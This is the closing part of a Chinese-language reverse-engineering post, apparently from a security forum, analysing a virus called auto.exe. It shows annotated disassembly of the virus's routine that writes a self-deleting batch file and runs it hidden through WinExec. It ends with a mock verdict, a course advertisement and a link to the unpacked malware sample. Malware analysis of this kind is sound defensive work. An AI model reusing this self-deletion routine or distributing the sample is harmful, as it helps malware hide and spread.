
```asm
004016F3                 call    strcpy

004016F8                 pop     ecx

004016F9                 lea     eax, [ebp+NumberOfBytesWritten]

004016FC                 pop     ecx

004016FD                 push    0               ; lpOverlapped

004016FF                 push    eax             ; lpNumberOfBytesWritten

00401700                 lea     eax, [ebp+Buffer]

00401706                 push    eax

00401707                 call    esi ; lstrlen

00401709                 push    eax             ; nNumberOfBytesToWrite

0040170A                 lea     eax, [ebp+Buffer]

00401710                 push    eax             ; lpBuffer

00401711                 push    [ebp+hObject]   ; hFile

00401714                 call    edi ; WriteFile

00401716                 lea     eax, [ebp+var\_szFilename] ; 病毒文件名

0040171C                 push    eax

0040171D                 lea     eax, [ebp+Buffer]

00401723                 push    eax

00401724                 call    strcpy

00401729                 pop     ecx

0040172A                 lea     eax, [ebp+NumberOfBytesWritten]

0040172D                 pop     ecx

0040172E                 push    0               ; lpOverlapped

00401730                 push    eax             ; lpNumberOfBytesWritten

00401731                 lea     eax, [ebp+Buffer]

00401737                 push    eax

00401738                 call    esi ; lstrlen

0040173A                 push    eax             ; nNumberOfBytesToWrite

0040173B                 lea     eax, [ebp+Buffer]

00401741                 push    eax             ; lpBuffer

00401742                 push    [ebp+hObject]   ; hFile

00401745                 call    edi ; WriteFile

00401747                 lea     eax, [ebp+Buffer]

0040174D                 push    offset asc\_410B44 ; "\"\r\n"

00401752                 push    eax

00401753                 call    ebx ; lstrcpy

00401755                 lea     eax, [ebp+NumberOfBytesWritten]

00401758                 push    0               ; lpOverlapped

0040175A                 push    eax             ; lpNumberOfBytesWritten

0040175B                 lea     eax, [ebp+Buffer]

00401761                 push    eax

00401762                 call    esi ; lstrlen

00401764                 push    eax             ; nNumberOfBytesToWrite

00401765                 lea     eax, [ebp+Buffer]

0040176B                 push    eax             ; lpBuffer

0040176C                 push    [ebp+hObject]   ; hFile

0040176F                 call    edi ; WriteFile

00401771                 lea     eax, [ebp+Buffer]

00401777                 push    offset aIfExist ; "if exist \""

0040177C                 push    eax

0040177D                 call    ebx ; lstrcpy

0040177F                 lea     eax, [ebp+NumberOfBytesWritten]

00401782                 push    0               ; lpOverlapped

00401784                 push    eax             ; lpNumberOfBytesWritten

00401785                 lea     eax, [ebp+Buffer]

0040178B                 push    eax

0040178C                 call    esi ; lstrlen

0040178E                 push    eax             ; nNumberOfBytesToWrite

0040178F                 lea     eax, [ebp+Buffer]

00401795                 push    eax             ; lpBuffer

00401796                 push    [ebp+hObject]   ; hFile

00401799                 call    edi ; WriteFile

0040179B                 lea     eax, [ebp+var\_szFilename] ; 病毒文件名

004017A1                 push    eax

004017A2                 lea     eax, [ebp+Buffer]

004017A8                 push    eax

004017A9                 call    ebx ; lstrcpy

004017AB                 lea     eax, [ebp+NumberOfBytesWritten]

004017AE                 push    0               ; lpOverlapped

004017B0                 push    eax             ; lpNumberOfBytesWritten

004017B1                 lea     eax, [ebp+Buffer]

004017B7                 push    eax

004017B8                 call    esi ; lstrlen

004017BA                 push    eax             ; nNumberOfBytesToWrite

004017BB                 lea     eax, [ebp+Buffer]

004017C1                 push    eax             ; lpBuffer

004017C2                 push    [ebp+hObject]   ; hFile

004017C5                 call    edi ; WriteFile

004017C7                 lea     eax, [ebp+Buffer]

004017CD                 push    offset aGotoSelfkill ; "\" goto selfkill\r\n"

004017D2                 push    eax

004017D3                 call    ebx ; lstrcpy

004017D5                 lea     eax, [ebp+NumberOfBytesWritten]

004017D8                 push    0               ; lpOverlapped

004017DA                 push    eax             ; lpNumberOfBytesWritten

004017DB                 lea     eax, [ebp+Buffer]

004017E1                 push    eax

004017E2                 call    esi ; lstrlen

004017E4                 push    eax             ; nNumberOfBytesToWrite

004017E5                 lea     eax, [ebp+Buffer]

004017EB                 push    eax             ; lpBuffer

004017EC                 push    [ebp+hObject]   ; hFile

004017EF                 call    edi ; WriteFile

004017F1                 lea     eax, [ebp+Buffer]

004017F7                 push    offset dword\_410B18

004017FC                 push    eax

004017FD                 call    ebx ; lstrcpy

004017FF                 push    0               ; lpOverlapped

00401801                 lea     eax, [ebp+NumberOfBytesWritten]

00401804                 push    eax             ; lpNumberOfBytesWritten

00401805                 lea     eax, [ebp+Buffer]

0040180B                 push    eax

0040180C                 call    esi ; lstrlen

0040180E                 push    eax             ; nNumberOfBytesToWrite

0040180F                 lea     eax, [ebp+Buffer]

00401815                 push    eax             ; lpBuffer

00401816                 push    [ebp+hObject]   ; hFile

00401819                 call    edi ; WriteFile

0040181B                 push    1

0040181D                 pop     edi

0040181E

0040181E loc\_40181E:

0040181E                 push    [ebp+hObject]   ; hObject

00401821                 call    ds:CloseHandle

00401827                 lea     eax, [ebp+var\_szDelCmdLine]

0040182D                 push    SW\_HIDE         ; uCmdShow

0040182F                 push    eax             ; lpCmdLine

00401830                 call    ds:WinExec      ; 执行del.bat

00401836

00401836 loc\_401836:

00401836                 mov     eax, edi

00401838

00401838 loc\_401838:

00401838                 pop     edi

00401839                 pop     esi

0040183A                 pop     ebx

0040183B                 leave

0040183C                 retn

0040183C Del\_InfectingHost endp
```

```
00402BFA
```

## 总结

判处 `auto.exe` 病毒死刑，剥夺政治权利终身，此审为终审判决，不得上诉。

加个脱了壳的尸体：

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

上传的附件：

- [Unpacked\_auto.rar](javascript:void(0);)

  （31.15kb，102次下载）
